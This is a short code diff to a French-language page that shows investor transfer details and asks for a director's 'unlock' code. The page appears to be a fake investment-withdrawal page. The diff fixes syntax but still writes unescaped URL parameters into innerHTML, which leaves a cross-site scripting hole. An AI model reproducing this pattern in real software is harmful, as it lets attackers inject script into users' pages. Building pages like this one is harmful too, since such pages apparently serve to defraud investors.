@@ -141,12 +141,12 @@
         const totalAmount = urlParams.get('totalAmount');
         const alertMessage = urlParams.get('alertMessage');
 
+        // Fix: Using correct innerHTML syntax with string concatenation
         document.getElementById('investor-info').innerHTML = 
-            <div class="transfer-text">Nom de l'investisseur : ${investorName}</div>
-            <div class="transfer-text">Numéro de transaction : ${transactionNumber}</div>
-            <div class="transfer-text">Réseau utilisé : ${network}</div>
-            <div class="transfer-text">Montant total à recevoir : ${totalAmount}</div>
-        ;
+            `<div class="transfer-text">Nom de l'investisseur : ${investorName}</div>` +
+            `<div class="transfer-text">Numéro de transaction : ${transactionNumber}</div>` +
+            `<div class="transfer-text">Réseau utilisé : ${network}</div>` +
+            `<div class="transfer-text">Montant total à recevoir : ${totalAmount}</div>`;
 
         document.querySelector('#btn-deblock').addEventListener('click', () => {
             let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
